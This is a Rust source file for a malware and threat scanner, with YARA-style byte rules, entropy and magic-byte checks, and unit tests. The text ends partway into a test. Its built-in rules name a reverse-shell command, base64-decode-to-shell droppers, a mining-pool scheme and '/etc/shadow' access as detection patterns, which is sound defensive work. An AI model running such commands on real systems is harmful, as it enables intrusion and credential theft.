//! Phylax — Threat Detection Engine for AGNOS
//!
//! Native, AI-powered threat scanning with YARA-compatible rules, entropy
//! analysis, and file content inspection.  Named after the Greek word for
//! guardian/watchman — phylax detects while aegis defends.
//!
//! Design principles:
//! - No external AV dependency — pure Rust scanning engine
//! - AI-native: ML classifier + LLM triage are first-class
//! - Integrates with aegis (quarantine) and anomaly detection
//! - Threat definitions distributed as signed ark packages
//! - Edge-aware: minimal rule subset for constrained devices

use std::collections::HashMap;
use std::fmt;
use std::path::{Path, PathBuf};

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};
use uuid::Uuid;

// ---------------------------------------------------------------------------
// ScanTarget
// ---------------------------------------------------------------------------

/// What kind of entity is being scanned.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ScanTarget {
    /// A file at the given path.
    File(PathBuf),
    /// An agent binary/package by agent ID.
    Agent(String),
    /// A package from ark/mela.
    Package(String),
    /// Raw bytes (e.g. in-memory payload).
    Memory,
}

impl fmt::Display for ScanTarget {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::File(p) => write!(f, "file:{}", p.display()),
            Self::Agent(id) => write!(f, "agent:{id}"),
            Self::Package(name) => write!(f, "package:{name}"),
            Self::Memory => write!(f, "memory"),
        }
    }
}

// ---------------------------------------------------------------------------
// FindingCategory
// ---------------------------------------------------------------------------

/// Category of a threat finding.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum FindingCategory {
    /// Known malware signature match.
    Malware,
    /// Ransomware-like behaviour (high entropy writes, rapid encryption).
    Ransomware,
    /// Suspicious but not definitively malicious.
    Suspicious,
    /// Polyglot file or embedded payload.
    EmbeddedPayload,
    /// Known-vulnerable dependency in a package.
    VulnerableDependency,
    /// Behaviour anomaly detected by ML classifier.
    BehaviorAnomaly,
    /// Matched a custom/user-defined rule.
    CustomRule,
}

impl fmt::Display for FindingCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Malware => "malware",
            Self::Ransomware => "ransomware",
            Self::Suspicious => "suspicious",
            Self::EmbeddedPayload => "embedded_payload",
            Self::VulnerableDependency => "vulnerable_dependency",
            Self::BehaviorAnomaly => "behavior_anomaly",
            Self::CustomRule => "custom_rule",
        };
        write!(f, "{label}")
    }
}

// ---------------------------------------------------------------------------
// ThreatSeverity
// ---------------------------------------------------------------------------

/// Severity of a scan finding — mirrors aegis ThreatLevel for interop.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ThreatSeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl ThreatSeverity {
    fn rank(self) -> u8 {
        match self {
            Self::Critical => 0,
            Self::High => 1,
            Self::Medium => 2,
            Self::Low => 3,
            Self::Info => 4,
        }
    }
}

impl PartialOrd for ThreatSeverity {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

impl Ord for ThreatSeverity {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        self.rank().cmp(&other.rank())
    }
}

impl fmt::Display for ThreatSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Critical => write!(f, "CRITICAL"),
            Self::High => write!(f, "HIGH"),
            Self::Medium => write!(f, "MEDIUM"),
            Self::Low => write!(f, "LOW"),
            Self::Info => write!(f, "INFO"),
        }
    }
}

// ---------------------------------------------------------------------------
// YaraRule
// ---------------------------------------------------------------------------

/// A single YARA-compatible rule for pattern matching.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct YaraRule {
    /// Unique rule identifier (e.g. "AGNOS_RANSOMWARE_001").
    pub id: String,
    /// Human-readable description.
    pub description: String,
    /// Category this rule detects.
    pub category: FindingCategory,
    /// Severity when this rule matches.
    pub severity: ThreatSeverity,
    /// Byte patterns to match (hex-encoded).
    pub patterns: Vec<String>,
    /// Tags for filtering/grouping.
    pub tags: Vec<String>,
    /// Whether the rule is enabled.
    pub enabled: bool,
}

impl YaraRule {
    /// Check if any of the rule's patterns match the given data.
    pub fn matches(&self, data: &[u8]) -> bool {
        if !self.enabled {
            return false;
        }
        for pattern in &self.patterns {
            if let Some(bytes) = Self::hex_to_bytes(pattern) {
                if Self::contains_subsequence(data, &bytes) {
                    return true;
                }
            }
        }
        false
    }

    /// Convert a hex string (e.g. "4d5a") to bytes.
    fn hex_to_bytes(hex: &str) -> Option<Vec<u8>> {
        let clean: String = hex.chars().filter(|c| !c.is_whitespace()).collect();
        if !clean.len().is_multiple_of(2) {
            return None;
        }
        (0..clean.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&clean[i..i + 2], 16).ok())
            .collect()
    }

    /// Substring search on byte slices.
    fn contains_subsequence(haystack: &[u8], needle: &[u8]) -> bool {
        if needle.is_empty() {
            return true;
        }
        haystack.windows(needle.len()).any(|w| w == needle)
    }
}

// ---------------------------------------------------------------------------
// ScanFinding
// ---------------------------------------------------------------------------

/// A single finding from a scan.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanFinding {
    pub id: String,
    pub severity: ThreatSeverity,
    pub category: FindingCategory,
    pub description: String,
    /// The rule that triggered this finding, if any.
    pub rule_id: Option<String>,
    /// Byte offset where the match was found, if applicable.
    pub offset: Option<u64>,
    /// Recommendation for remediation.
    pub recommendation: String,
}

impl ScanFinding {
    /// Create a new finding.
    pub fn new(
        severity: ThreatSeverity,
        category: FindingCategory,
        description: impl Into<String>,
        recommendation: impl Into<String>,
    ) -> Self {
        Self {
            id: Uuid::new_v4().to_string(),
            severity,
            category,
            description: description.into(),
            rule_id: None,
            offset: None,
            recommendation: recommendation.into(),
        }
    }

    /// Attach a rule ID to this finding.
    pub fn with_rule(mut self, rule_id: impl Into<String>) -> Self {
        self.rule_id = Some(rule_id.into());
        self
    }

    /// Attach a byte offset to this finding.
    pub fn with_offset(mut self, offset: u64) -> Self {
        self.offset = Some(offset);
        self
    }
}

// ---------------------------------------------------------------------------
// ScanMode
// ---------------------------------------------------------------------------

/// How the scan was triggered.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ScanMode {
    /// User/agent requested a manual scan.
    OnDemand,
    /// Triggered by fanotify real-time monitoring.
    RealTime,
    /// Periodic scheduled scan.
    Scheduled,
    /// Pre-install scan for packages.
    PreInstall,
    /// Pre-execution scan for agent binaries.
    PreExec,
}

impl fmt::Display for ScanMode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::OnDemand => write!(f, "on_demand"),
            Self::RealTime => write!(f, "real_time"),
            Self::Scheduled => write!(f, "scheduled"),
            Self::PreInstall => write!(f, "pre_install"),
            Self::PreExec => write!(f, "pre_exec"),
        }
    }
}

// ---------------------------------------------------------------------------
// ScanResult
// ---------------------------------------------------------------------------

/// Result of a single scan operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub id: String,
    pub target: ScanTarget,
    pub mode: ScanMode,
    pub started_at: DateTime<Utc>,
    pub completed_at: DateTime<Utc>,
    pub findings: Vec<ScanFinding>,
    /// Shannon entropy of the scanned data (0.0–8.0).
    pub entropy: Option<f64>,
    /// File size in bytes, if applicable.
    pub file_size: Option<u64>,
    /// Whether the target is considered clean (no findings above Info).
    pub clean: bool,
}

impl ScanResult {
    /// Highest severity among all findings, or Info if none.
    pub fn max_severity(&self) -> ThreatSeverity {
        self.findings
            .iter()
            .map(|f| f.severity)
            .min() // min because Critical < High < Medium ...
            .unwrap_or(ThreatSeverity::Info)
    }

    /// Count findings at the given severity.
    pub fn count_by_severity(&self, severity: ThreatSeverity) -> usize {
        self.findings
            .iter()
            .filter(|f| f.severity == severity)
            .count()
    }
}

// ---------------------------------------------------------------------------
// PhylaxConfig
// ---------------------------------------------------------------------------

/// Configuration for the Phylax scanner.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhylaxConfig {
    /// Enable on-access scanning via fanotify.
    pub realtime_enabled: bool,
    /// Enable pre-install scanning for ark/mela packages.
    pub scan_on_install: bool,
    /// Enable pre-exec scanning for agent binaries.
    pub scan_on_exec: bool,
    /// Periodic scan interval in seconds (0 = disabled).
    pub periodic_scan_interval_secs: u64,
    /// Entropy threshold for ransomware detection (0.0–8.0).
    pub entropy_threshold: f64,
    /// Maximum file size to scan in bytes (skip larger files).
    pub max_scan_size: u64,
    /// Directories to monitor for real-time scanning.
    pub watch_paths: Vec<PathBuf>,
    /// Directories to exclude from scanning.
    pub exclude_paths: Vec<PathBuf>,
    /// Path to the signature database.
    pub signature_db_path: PathBuf,
    /// Whether to forward findings to aegis for quarantine.
    pub aegis_integration: bool,
    /// Minimum severity to report to aegis.
    pub aegis_report_threshold: ThreatSeverity,
    /// Maximum scan history entries to retain.
    pub max_history: usize,
}

impl Default for PhylaxConfig {
    fn default() -> Self {
        Self {
            realtime_enabled: true,
            scan_on_install: true,
            scan_on_exec: true,
            periodic_scan_interval_secs: 3600,
            entropy_threshold: 7.5,
            max_scan_size: 100 * 1024 * 1024, // 100 MB
            watch_paths: vec![
                PathBuf::from("/var/lib/agnos/agents"),
                PathBuf::from("/var/lib/agnos/marketplace"),
                PathBuf::from("/tmp"),
            ],
            exclude_paths: vec![
                PathBuf::from("/proc"),
                PathBuf::from("/sys"),
                PathBuf::from("/dev"),
            ],
            signature_db_path: PathBuf::from("/var/lib/agnos/phylax/signatures.phylax-db"),
            aegis_integration: true,
            aegis_report_threshold: ThreatSeverity::Medium,
            max_history: 10_000,
        }
    }
}

// ---------------------------------------------------------------------------
// PhylaxStats
// ---------------------------------------------------------------------------

/// Aggregate statistics from the Phylax scanner.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhylaxStats {
    pub total_scans: usize,
    pub clean_scans: usize,
    pub dirty_scans: usize,
    pub total_findings: usize,
    pub findings_by_severity: HashMap<String, usize>,
    pub findings_by_category: HashMap<String, usize>,
    pub rules_loaded: usize,
    pub rules_enabled: usize,
    pub last_scan_at: Option<DateTime<Utc>>,
    pub last_signature_update: Option<DateTime<Utc>>,
}

// ---------------------------------------------------------------------------
// PhylaxScanner
// ---------------------------------------------------------------------------

/// The Phylax threat detection engine.
///
/// Provides YARA-compatible rule matching, entropy analysis, file content
/// inspection, and coordination with aegis for quarantine decisions.
pub struct PhylaxScanner {
    config: PhylaxConfig,
    rules: Vec<YaraRule>,
    scan_history: Vec<ScanResult>,
    total_findings: usize,
    findings_by_severity: HashMap<ThreatSeverity, usize>,
    findings_by_category: HashMap<FindingCategory, usize>,
    last_signature_update: Option<DateTime<Utc>>,
}

impl PhylaxScanner {
    /// Create a new Phylax scanner with the given configuration.
    pub fn new(config: PhylaxConfig) -> Self {
        info!("Phylax threat detection engine initialising");
        Self {
            config,
            rules: Vec::new(),
            scan_history: Vec::new(),
            total_findings: 0,
            findings_by_severity: HashMap::new(),
            findings_by_category: HashMap::new(),
            last_signature_update: None,
        }
    }

    /// Create a scanner with default configuration.
    pub fn with_defaults() -> Self {
        Self::new(PhylaxConfig::default())
    }

    // -----------------------------------------------------------------------
    // Rule management
    // -----------------------------------------------------------------------

    /// Load a YARA rule into the engine.
    pub fn add_rule(&mut self, rule: YaraRule) {
        debug!("Loading rule: {} ({})", rule.id, rule.category);
        self.rules.push(rule);
    }

    /// Load multiple rules at once.
    pub fn add_rules(&mut self, rules: Vec<YaraRule>) {
        let count = rules.len();
        for rule in rules {
            self.rules.push(rule);
        }
        info!("Loaded {count} rules ({} total)", self.rules.len());
    }

    /// Remove a rule by ID. Returns true if the rule was found and removed.
    pub fn remove_rule(&mut self, rule_id: &str) -> bool {
        let before = self.rules.len();
        self.rules.retain(|r| r.id != rule_id);
        before != self.rules.len()
    }

    /// Enable or disable a rule by ID. Returns true if the rule was found.
    pub fn set_rule_enabled(&mut self, rule_id: &str, enabled: bool) -> bool {
        if let Some(rule) = self.rules.iter_mut().find(|r| r.id == rule_id) {
            rule.enabled = enabled;
            true
        } else {
            false
        }
    }

    /// Get a rule by ID.
    pub fn get_rule(&self, rule_id: &str) -> Option<&YaraRule> {
        self.rules.iter().find(|r| r.id == rule_id)
    }

    /// List all loaded rules.
    pub fn rules(&self) -> &[YaraRule] {
        &self.rules
    }

    /// Count enabled rules.
    pub fn enabled_rules_count(&self) -> usize {
        self.rules.iter().filter(|r| r.enabled).count()
    }

    /// Update the signature database timestamp.
    pub fn mark_signatures_updated(&mut self) {
        self.last_signature_update = Some(Utc::now());
        info!("Signature database updated");
    }

    // -----------------------------------------------------------------------
    // Scanning
    // -----------------------------------------------------------------------

    /// Scan raw bytes against all loaded rules and perform entropy analysis.
    pub fn scan_bytes(&mut self, data: &[u8], target: ScanTarget, mode: ScanMode) -> ScanResult {
        let started_at = Utc::now();
        let mut findings = Vec::new();

        // --- YARA rule matching ---
        for rule in &self.rules {
            if rule.matches(data) {
                let mut finding = ScanFinding::new(
                    rule.severity,
                    rule.category.clone(),
                    &rule.description,
                    format!("Matched rule {}", rule.id),
                )
                .with_rule(&rule.id);

                // Try to find offset of first pattern match for context.
                if let Some(pattern) = rule.patterns.first() {
                    if let Some(bytes) = YaraRule::hex_to_bytes(pattern) {
                        if let Some(pos) = data
                            .windows(bytes.len())
                            .position(|w| w == bytes.as_slice())
                        {
                            finding = finding.with_offset(pos as u64);
                        }
                    }
                }

                findings.push(finding);
            }
        }

        // --- Entropy analysis ---
        let entropy = Self::shannon_entropy(data);
        if entropy >= self.config.entropy_threshold && data.len() > 1024 {
            findings.push(ScanFinding::new(
                ThreatSeverity::Medium,
                FindingCategory::Ransomware,
                format!(
                    "High entropy detected: {:.2} (threshold: {:.1})",
                    entropy, self.config.entropy_threshold
                ),
                "Investigate for potential ransomware or encrypted payload",
            ));
        }

        // --- Magic byte checks ---
        findings.extend(self.check_magic_bytes(data));

        let clean = !findings.iter().any(|f| f.severity != ThreatSeverity::Info);
        let completed_at = Utc::now();

        // Update stats.
        for finding in &findings {
            self.total_findings += 1;
            *self
                .findings_by_severity
                .entry(finding.severity)
                .or_insert(0) += 1;
            *self
                .findings_by_category
                .entry(finding.category.clone())
                .or_insert(0) += 1;
        }

        let result = ScanResult {
            id: Uuid::new_v4().to_string(),
            target,
            mode,
            started_at,
            completed_at,
            entropy: Some(entropy),
            file_size: Some(data.len() as u64),
            findings,
            clean,
        };

        debug!(
            "Scan complete: {} — {} findings, entropy {:.2}",
            result.target,
            result.findings.len(),
            entropy
        );

        // Store in history, respecting max_history.
        self.scan_history.push(result.clone());
        if self.scan_history.len() > self.config.max_history {
            self.scan_history.remove(0);
        }

        result
    }

    /// Scan a file at the given path.
    pub fn scan_file(&mut self, path: &Path, mode: ScanMode) -> ScanResult {
        let target = ScanTarget::File(path.to_path_buf());

        match std::fs::read(path) {
            Ok(data) => {
                if data.len() as u64 > self.config.max_scan_size {
                    warn!(
                        "File too large to scan: {} ({} bytes, max {})",
                        path.display(),
                        data.len(),
                        self.config.max_scan_size
                    );
                    let now = Utc::now();
                    let result = ScanResult {
                        id: Uuid::new_v4().to_string(),
                        target,
                        mode,
                        started_at: now,
                        completed_at: now,
                        findings: vec![ScanFinding::new(
                            ThreatSeverity::Info,
                            FindingCategory::Suspicious,
                            format!("File too large to scan: {} bytes", data.len()),
                            "Consider splitting the file or increasing max_scan_size",
                        )],
                        entropy: None,
                        file_size: Some(data.len() as u64),
                        clean: true,
                    };
                    self.scan_history.push(result.clone());
                    return result;
                }
                self.scan_bytes(&data, target, mode)
            }
            Err(e) => {
                warn!("Failed to read file for scanning: {}: {e}", path.display());
                let now = Utc::now();
                let result = ScanResult {
                    id: Uuid::new_v4().to_string(),
                    target,
                    mode,
                    started_at: now,
                    completed_at: now,
                    findings: vec![ScanFinding::new(
                        ThreatSeverity::Info,
                        FindingCategory::Suspicious,
                        format!("Could not read file: {e}"),
                        "Check file permissions and path",
                    )],
                    entropy: None,
                    file_size: None,
                    clean: true,
                };
                self.scan_history.push(result.clone());
                result
            }
        }
    }

    /// Scan an agent by ID — scans the agent's binary path.
    pub fn scan_agent(&mut self, agent_id: &str, binary_path: &Path, mode: ScanMode) -> ScanResult {
        let target = ScanTarget::Agent(agent_id.to_string());
        match std::fs::read(binary_path) {
            Ok(data) => self.scan_bytes(&data, target, mode),
            Err(e) => {
                let now = Utc::now();
                let result = ScanResult {
                    id: Uuid::new_v4().to_string(),
                    target,
                    mode,
                    started_at: now,
                    completed_at: now,
                    findings: vec![ScanFinding::new(
                        ThreatSeverity::Info,
                        FindingCategory::Suspicious,
                        format!("Could not read agent binary: {e}"),
                        "Verify the agent binary path is correct",
                    )],
                    entropy: None,
                    file_size: None,
                    clean: true,
                };
                self.scan_history.push(result.clone());
                result
            }
        }
    }

    // -----------------------------------------------------------------------
    // Entropy analysis
    // -----------------------------------------------------------------------

    /// Calculate Shannon entropy of a byte slice (0.0 = uniform, 8.0 = random).
    pub fn shannon_entropy(data: &[u8]) -> f64 {
        if data.is_empty() {
            return 0.0;
        }

        let mut counts = [0u64; 256];
        for &byte in data {
            counts[byte as usize] += 1;
        }

        let len = data.len() as f64;
        let mut entropy = 0.0;
        for &count in &counts {
            if count > 0 {
                let p = count as f64 / len;
                entropy -= p * p.log2();
            }
        }
        entropy
    }

    // -----------------------------------------------------------------------
    // Magic byte inspection
    // -----------------------------------------------------------------------

    /// Check for suspicious magic bytes / file headers.
    fn check_magic_bytes(&self, data: &[u8]) -> Vec<ScanFinding> {
        let mut findings = Vec::new();

        if data.len() < 4 {
            return findings;
        }

        // ELF binary inside a non-binary context.
        if data.len() > 4 && &data[0..4] == b"\x7fELF" {
            findings.push(ScanFinding::new(
                ThreatSeverity::Info,
                FindingCategory::Suspicious,
                "ELF binary detected",
                "Verify this is an expected executable",
            ));
        }

        // PE (Windows executable) — unusual on AGNOS.
        if data.len() > 2 && &data[0..2] == b"MZ" {
            findings.push(ScanFinding::new(
                ThreatSeverity::Low,
                FindingCategory::Suspicious,
                "Windows PE executable detected on a Linux system",
                "Windows executables are unusual on AGNOS — verify intent",
            ));
        }

        // Shell script with unusual shebang.
        if data.len() > 20 && &data[0..2] == b"#!" {
            let first_line_end = data.iter().position(|&b| b == b'\n').unwrap_or(80).min(80);
            let shebang = String::from_utf8_lossy(&data[..first_line_end]);
            if shebang.contains("curl") || shebang.contains("wget") || shebang.contains("eval") {
                findings.push(ScanFinding::new(
                    ThreatSeverity::High,
                    FindingCategory::Suspicious,
                    format!("Suspicious shebang: {shebang}"),
                    "Script shebangs should not invoke download or eval tools",
                ));
            }
        }

        // Polyglot detection: PDF header not at offset 0.
        if data.len() > 1024 {
            if let Some(pos) = data.windows(5).position(|w| w == b"%PDF-") {
                if pos > 0 {
                    findings.push(ScanFinding::new(
                        ThreatSeverity::Medium,
                        FindingCategory::EmbeddedPayload,
                        format!("PDF header found at non-zero offset {pos} — possible polyglot"),
                        "File may contain hidden content before the PDF header",
                    ));
                }
            }
        }

        findings
    }

    // -----------------------------------------------------------------------
    // History & queries
    // -----------------------------------------------------------------------

    /// Get all scan results.
    pub fn scan_history(&self) -> &[ScanResult] {
        &self.scan_history
    }

    /// Get scan results for a specific target.
    pub fn scans_for_target(&self, target: &ScanTarget) -> Vec<&ScanResult> {
        self.scan_history
            .iter()
            .filter(|r| &r.target == target)
            .collect()
    }

    /// Get the most recent scan result.
    pub fn last_scan(&self) -> Option<&ScanResult> {
        self.scan_history.last()
    }

    /// Get scan results that had findings at or above the given severity.
    pub fn dirty_scans(&self, min_severity: ThreatSeverity) -> Vec<&ScanResult> {
        self.scan_history
            .iter()
            .filter(|r| r.max_severity() <= min_severity) // <= because Critical < High
            .collect()
    }

    /// Get scan results within a time window.
    pub fn scans_since(&self, since: DateTime<Utc>) -> Vec<&ScanResult> {
        self.scan_history
            .iter()
            .filter(|r| r.started_at >= since)
            .collect()
    }

    /// Get findings that should be forwarded to aegis based on threshold.
    pub fn findings_for_aegis(&self) -> Vec<(&ScanResult, &ScanFinding)> {
        if !self.config.aegis_integration {
            return Vec::new();
        }
        self.scan_history
            .iter()
            .flat_map(|r| {
                r.findings
                    .iter()
                    .filter(|f| f.severity <= self.config.aegis_report_threshold)
                    .map(move |f| (r, f))
            })
            .collect()
    }

    /// Check whether a path is in the exclusion list.
    pub fn is_excluded(&self, path: &Path) -> bool {
        self.config
            .exclude_paths
            .iter()
            .any(|excl| path.starts_with(excl))
    }

    /// Check whether a path is in a monitored directory.
    pub fn is_watched(&self, path: &Path) -> bool {
        self.config
            .watch_paths
            .iter()
            .any(|watch| path.starts_with(watch))
    }

    // -----------------------------------------------------------------------
    // Stats
    // -----------------------------------------------------------------------

    /// Get aggregate statistics.
    pub fn stats(&self) -> PhylaxStats {
        let clean_scans = self.scan_history.iter().filter(|r| r.clean).count();
        let dirty_scans = self.scan_history.len() - clean_scans;

        PhylaxStats {
            total_scans: self.scan_history.len(),
            clean_scans,
            dirty_scans,
            total_findings: self.total_findings,
            findings_by_severity: self
                .findings_by_severity
                .iter()
                .map(|(k, v)| (k.to_string(), *v))
                .collect(),
            findings_by_category: self
                .findings_by_category
                .iter()
                .map(|(k, v)| (k.to_string(), *v))
                .collect(),
            rules_loaded: self.rules.len(),
            rules_enabled: self.enabled_rules_count(),
            last_scan_at: self.scan_history.last().map(|r| r.completed_at),
            last_signature_update: self.last_signature_update,
        }
    }

    /// Get the scanner configuration.
    pub fn config(&self) -> &PhylaxConfig {
        &self.config
    }

    /// Update the scanner configuration.
    pub fn set_config(&mut self, config: PhylaxConfig) {
        self.config = config;
    }

    // -----------------------------------------------------------------------
    // Built-in rule sets
    // -----------------------------------------------------------------------

    /// Load a default set of built-in rules for common threats.
    pub fn load_builtin_rules(&mut self) {
        let builtins = vec![
            YaraRule {
                id: "PHYLAX_EICAR_TEST".to_string(),
                description: "EICAR antivirus test file".to_string(),
                category: FindingCategory::Malware,
                severity: ThreatSeverity::Info,
                patterns: vec![
                    // EICAR test string in hex
                    "5835304021405025415050".to_string(),
                ],
                tags: vec!["test".to_string(), "eicar".to_string()],
                enabled: true,
            },
            YaraRule {
                id: "PHYLAX_SHELL_REVERSE".to_string(),
                description: "Potential reverse shell pattern".to_string(),
                category: FindingCategory::Malware,
                severity: ThreatSeverity::Critical,
                patterns: vec![
                    // /bin/sh -i >& /dev/tcp
                    "2f62696e2f7368202d69203e26202f6465762f746370".to_string(),
                ],
                tags: vec!["shell".to_string(), "reverse".to_string()],
                enabled: true,
            },
            YaraRule {
                id: "PHYLAX_CRYPTO_MINER".to_string(),
                description: "Cryptocurrency mining indicator".to_string(),
                category: FindingCategory::Malware,
                severity: ThreatSeverity::High,
                patterns: vec![
                    // "stratum+tcp://"
                    "7374726174756d2b7463703a2f2f".to_string(),
                ],
                tags: vec!["miner".to_string(), "crypto".to_string()],
                enabled: true,
            },
            YaraRule {
                id: "PHYLAX_BASE64_EXEC".to_string(),
                description: "Base64-encoded command execution".to_string(),
                category: FindingCategory::Suspicious,
                severity: ThreatSeverity::Medium,
                patterns: vec![
                    // "base64 -d | sh" (common dropper pattern)
                    "626173653634202d64207c207368".to_string(),
                    // "base64 --decode | bash"
                    "626173653634202d2d6465636f6465207c2062617368".to_string(),
                ],
                tags: vec!["encoding".to_string(), "execution".to_string()],
                enabled: true,
            },
            YaraRule {
                id: "PHYLAX_PASSWD_ACCESS".to_string(),
                description: "Direct /etc/passwd or /etc/shadow access".to_string(),
                category: FindingCategory::Suspicious,
                severity: ThreatSeverity::Medium,
                patterns: vec![
                    // "/etc/shadow"
                    "2f6574632f736861646f77".to_string(),
                ],
                tags: vec!["credential".to_string(), "access".to_string()],
                enabled: true,
            },
        ];

        let count = builtins.len();
        self.add_rules(builtins);
        info!("Loaded {count} built-in rules");
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    fn default_scanner() -> PhylaxScanner {
        PhylaxScanner::new(PhylaxConfig::default())
    }

    fn scanner_with_builtins() -> PhylaxScanner {
        let mut s = default_scanner();
        s.load_builtin_rules();
        s
    }

    fn sample_rule() -> YaraRule {
        YaraRule {
            id: "TEST_RULE_001".to_string(),
            description: "Test rule: detects 'MALWARE' string".to_string(),
            category: FindingCategory::Malware,
            severity: ThreatSeverity::High,
            patterns: vec!["4d414c57415245".to_string()], // "MALWARE"
            tags: vec!["test".to_string()],
            enabled: true,
        }
    }

    // -----------------------------------------------------------------------
    // ThreatSeverity
    // -----------------------------------------------------------------------

    #[test]
    fn threat_severity_ordering() {
        assert!(ThreatSeverity::Critical < ThreatSeverity::High);
        assert!(ThreatSeverity::High < ThreatSeverity::Medium);
        assert!(ThreatSeverity::Medium < ThreatSeverity::Low);
        assert!(ThreatSeverity::Low < ThreatSeverity::Info);
    }

    #[test]
    fn threat_severity_display() {
        assert_eq!(ThreatSeverity::Critical.to_string(), "CRITICAL");
        assert_eq!(ThreatSeverity::Info.to_string(), "INFO");
    }

    // -----------------------------------------------------------------------
    // FindingCategory
    // -----------------------------------------------------------------------

    #[test]
    fn finding_category_display() {
        assert_eq!(FindingCategory::Malware.to_string(), "malware");
        assert_eq!(FindingCategory::Ransomware.to_string(), "ransomware");
        assert_eq!(
            FindingCategory::EmbeddedPayload.to_string(),
            "embedded_payload"
        );
        assert_eq!(
            FindingCategory::BehaviorAnomaly.to_string(),
            "behavior_anomaly"
        );
    }

    // -----------------------------------------------------------------------
    // ScanTarget
    // -----------------------------------------------------------------------

    #[test]
    fn scan_target_display() {
        assert_eq!(
            ScanTarget::File(PathBuf::from("/tmp/test")).to_string(),
            "file:/tmp/test"
        );
        assert_eq!(
            ScanTarget::Agent("agent-1".into()).to_string(),
            "agent:agent-1"
        );
        assert_eq!(
            ScanTarget::Package("my-pkg".into()).to_string(),
            "package:my-pkg"
        );
        assert_eq!(ScanTarget::Memory.to_string(), "memory");
    }

    // -----------------------------------------------------------------------
    // ScanMode
    // -----------------------------------------------------------------------

    #[test]
    fn scan_mode_display() {
        assert_eq!(ScanMode::OnDemand.to_string(), "on_demand");
        assert_eq!(ScanMode::RealTime.to_string(), "real_time");
        assert_eq!(ScanMode::Scheduled.to_string(), "scheduled");
        assert_eq!(ScanMode::PreInstall.to_string(), "pre_install");
        assert_eq!(ScanMode::PreExec.to_string(), "pre_exec");
    }

    // -----------------------------------------------------------------------
    // YaraRule
    // -----------------------------------------------------------------------

    #[test]
    fn yara_hex_to_bytes_valid() {
        let bytes = YaraRule::hex_to_bytes("4d5a").unwrap();
        assert_eq!(bytes, vec![0x4d, 0x5a]);
    }

    #[test]
    fn yara_hex_to_bytes_with_spaces() {
        let bytes = YaraRule::hex_to_bytes("4d 5a 90 00").unwrap();
        assert_eq!(bytes, vec![0x4d, 0x5a, 0x90, 0x00]);
    }

    #[test]
    fn yara_hex_to_bytes_odd_length() {
        assert!(YaraRule::hex_to_bytes("4d5").is_none());
    }

    #[test]
    fn yara_rule_matches_present() {
        let rule = sample_rule();
        assert!(rule.matches(b"contains MALWARE here"));
    }

    #[test]
    fn yara_rule_matches_absent() {
        let rule = sample_rule();
        assert!(!rule.matches(b"clean file content"));
    }

    #[test]
    fn yara_rule_disabled_never_matches() {
        let mut rule = sample_rule();
        rule.enabled = false;
        assert!(!rule.matches(b"contains MALWARE here"));
    }

    #[test]
    fn yara_rule_matches_at_start() {
        let rule = sample_rule();
        assert!(rule.matches(b"MALWARE at start"));
    }

    #[test]
    fn yara_rule_matches_at_end() {
        let rule = sample_rule();
        assert!(rule.matches(b"at end MALWARE"));
    }

    #[test]
    fn yara_rule_empty_data() {
        let rule = sample_rule();
        assert!(!rule.matches(b""));
    }

    #[test]
    fn yara_rule_multiple_patterns() {
        let rule = YaraRule {
            id: "MULTI".to_string(),
            description: "Multi pattern".to_string(),
            category: FindingCategory::Suspicious,
            severity: ThreatSeverity::Medium,
            patterns: vec![
                "41414141".to_string(), // "AAAA"
                "42424242".to_string(), // "BBBB"
            ],
            tags: vec![],
            enabled: true,
        };
        assert!(rule.matches(b"has BBBB inside"));
        assert!(rule.matches(b"has AAAA inside"));
        assert!(!rule.matches(b"no match"));
    }

    // -----------------------------------------------------------------------
    // Entropy
    // -----------------------------------------------------------------------

    #[test]
    fn entropy_empty_data() {
        assert_eq!(PhylaxScanner::shannon_entropy(b""), 0.0);
    }

    #[test]
    fn entropy_uniform_data() {
        // All same byte → entropy = 0.
        let data = vec![0xAA; 1024];
        assert_eq!(PhylaxScanner::shannon_entropy(&data), 0.0);
    }

    #[test]
    fn entropy_two_values() {
        // Alternating two values → entropy = 1.0.
        let data: Vec<u8> = (0..1024).map(|i| if i % 2 == 0 { 0 } else { 1 }).collect();
        let e = PhylaxScanner::shannon_entropy(&data);
        assert!((e - 1.0).abs() < 0.01, "expected ~1.0, got {e}");
    }

    #[test]
    fn entropy_random_like() {
        // All 256 byte values equally → entropy ≈ 8.0.
        let mut data = Vec::with_capacity(256 * 100);
        for _ in 0..100 {
            for b in 0u8..=255 {
                data.push(b);
            }
        }
        let e = PhylaxScanner::shannon_entropy(&data);
        assert!(e > 7.9, "expected ~8.0, got {e}");
    }

    #[test]
    fn entropy_text_moderate() {
        let text = b"The quick brown fox jumps over the lazy dog. ";
        let data: Vec<u8> = text.iter().cycle().take(4096).copied().collect();
        let e = PhylaxScanner::shannon_entropy(&data);
        assert!(e > 3.0 && e < 5.0, "expected moderate entropy, got {e}");
    }

    // -----------------------------------------------------------------------
    // Magic bytes
    // -----------------------------------------------------------------------

    #[test]
    fn magic_bytes_elf() {
        let mut scanner = default_scanner();
